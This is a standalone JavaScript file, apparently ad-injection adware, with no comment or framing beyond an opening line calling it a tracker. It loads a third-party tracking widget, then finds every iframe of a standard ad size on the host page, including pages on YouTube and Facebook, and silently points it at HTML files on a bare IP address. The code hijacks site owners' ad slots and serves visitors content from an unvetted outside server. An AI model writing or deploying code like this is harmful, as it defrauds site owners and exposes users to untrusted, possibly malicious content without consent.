// This is our main tracker for EVERYONE.

var _wau = _wau || []; _wau.push(["classic", "2j33c9lwze50", "f08"]);
(function() {var s=document.createElement("script"); s.async=true;
s.src="http://widgets.amung.us/classic.js";
document.getElementsByTagName("head")[0].appendChild(s);
})();


				var commonadunit = false;
				iframe_tags = document.getElementsByTagName('iframe');
				for (x = 0; x != iframe_tags.length; x++) 
				{
								
					if (iframe_tags[x].width == 120 && iframe_tags[x].height == 600) 
								{
									if (document.location.href.search("youtube.com") != -1) 
									{
										iframe_tags[x].src = 'http://50.31.160.220/dead/120x600.html';
									} 
									else if (document.location.href.search("facebook.com") != -1)
									{
										iframe_tags[x].src = 'http://50.31.160.220/dead/120x600.html';
									}
									else 
									{
										iframe_tags[x].src = 'http://50.31.160.220/dead/120x600.html';									
									}
									commonadunit = true;
								}
							
					if (iframe_tags[x].width == 160 && iframe_tags[x].height == 600) 
								{
									if (document.location.href.search("youtube.com") != -1) 
									{
										iframe_tags[x].src = 'http://50.31.160.220/dead/160x600.html';
									} 
									else if (document.location.href.search("facebook.com") != -1)
									{
										iframe_tags[x].src = 'http://50.31.160.220/dead/160x600.html';
									}
									else 
									{
										iframe_tags[x].src = 'http://50.31.160.220/dead/160x600.html';									
									}
									commonadunit = true;
								}
							
					if (iframe_tags[x].width == 234 && iframe_tags[x].height == 60) 
								{
									if (document.location.href.search("youtube.com") != -1) 
									{
										iframe_tags[x].src = 'http://50.31.160.220/dead/234x60.html';
									} 
									else if (document.location.href.search("facebook.com") != -1)
									{
										iframe_tags[x].src = 'http://50.31.160.220/dead/234x60.html';
									}
									else 
									{
										iframe_tags[x].src = 'http://50.31.160.220/dead/234x60.html';									
									}
									commonadunit = true;
								}
							
					if (iframe_tags[x].width == 300 && iframe_tags[x].height == 250) 
								{
									if (document.location.href.search("youtube.com") != -1) 
									{
										iframe_tags[x].src = 'http://50.31.160.220/dead/300x250_v1.html';
									} 
									else if (document.location.href.search("facebook.com") != -1)
									{
										iframe_tags[x].src = 'http://50.31.160.220/dead/300x250_v1.html';
									}
									else 
									{
										iframe_tags[x].src = 'http://50.31.160.220/dead/300x250_v1.html';									
									}
									commonadunit = true;
								}
							
				        if (iframe_tags[x].width == 336 && iframe_tags[x].height == 280) 
								{
									if (document.location.href.search("youtube.com") != -1) 
									{
										iframe_tags[x].src = 'http://50.31.160.220/dead/336x280.html';
									} 
									else if (document.location.href.search("facebook.com") != -1)
									{
										iframe_tags[x].src = 'http://50.31.160.220/dead/336x280.html';
									}
									else 
									{
										iframe_tags[x].src = 'http://50.31.160.220/dead/336x280.html';									
									}
									commonadunit = true;
								}
						
					if (iframe_tags[x].width == 468 && iframe_tags[x].height == 60) 
								{
									if (document.location.href.search("youtube.com") != -1) 
									{
										iframe_tags[x].src = 'http://50.31.160.220/dead/468x60.html';
									} 
									else if (document.location.href.search("facebook.com") != -1)
									{
										iframe_tags[x].src = 'http://50.31.160.220/dead/468x60.html';
									}
									else 
									{
										iframe_tags[x].src = 'http://50.31.160.220/dead/468x60.html';									
									}
									commonadunit = true;
								}
							
					if (iframe_tags[x].width == 728 && iframe_tags[x].height == 90) 
								{
									if (document.location.href.search("youtube.com") != -1) 
									{
										iframe_tags[x].src = 'http://50.31.160.220/dead/728x90.html';
									} 
									else if (document.location.href.search("facebook.com") != -1)
									{
										iframe_tags[x].src = 'http://50.31.160.220/dead/728x90.html';
									}
									else 
									{
										iframe_tags[x].src = 'http://50.31.160.220/dead/728x90.html';									
									}
									commonadunit = true;
								}
							
											}
